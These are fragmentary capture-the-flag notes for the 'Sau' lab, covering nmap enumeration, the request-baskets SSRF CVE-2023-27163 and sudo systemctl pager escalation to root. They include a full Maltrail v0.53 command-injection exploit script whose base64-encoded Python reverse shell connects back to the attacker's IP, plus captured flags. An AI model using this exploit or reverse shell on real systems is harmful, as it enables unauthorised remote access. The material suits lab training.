@@ -1,0 +1,96 @@
+Sau Lab: Vulnerabilities: SSRF vulnerability (CVE-2023-27163), misconfigured systemctl sudo permissions
+
+Enumeration
+sudo nmap -sC -sV -p- --min-rate=1000 -Pn 10.129.229.26
+
+
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
+|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
+|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
+80/tcp    filtered http
+8338/tcp  filtered unknown
+55555/tcp open     unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+\
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+puma@sau:~$ cat user.txt
+cat user.txt
+5c3e1fafcaecb6ac140c58727fba4fed
+
+We exploited this CVE “request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.” 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163 
+
+
+https://www.exploit-db.com/ 
+python3 exploit.py 10.10.14.206 4444 http://10.129.229.26:55555/dch7s5k
+
+
+──╼ $cat exploit.py
+# Exploit Title: Maltrail v0.53 - Unauthenticated Remote Code Execution (RCE)
+# Exploit Author: Iyaad Luqman K (init_6)
+# Application: Maltrail v0.53
+# Tested on: Ubuntu 22.04
+
+# PoC
+import sys;
+import os;
+import base64;
+
+def main():
+	listening_IP = None
+	listening_PORT = None
+	target_URL = None
+
+	if len(sys.argv) != 4:
+		print("Error. Needs listening IP, PORT and target URL.")
+		return(-1)
+	
+	listening_IP = sys.argv[1]
+	listening_PORT = sys.argv[2]
+	target_URL = sys.argv[3] + "/login"
+	print("Running exploit on " + str(target_URL))
+	curl_cmd(listening_IP, listening_PORT, target_URL)
+
+def curl_cmd(my_ip, my_port, target_url):
+	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
+	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
+	os.system(command)
+
+if __name__ == "__main__":
+
+
+
+Privilege Escalation: 
+
+
+puma@sau:/$ sudo -l
+sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+
+We can run sudo on systemctl status trail.service
+
+sudo /usr/bin/systemctl status trail.service
+
+!/bin/bash
+
+Now we have root access
+
+
+cat root.txt
+b72ce1892a528ba70487e5e1b3987179
+
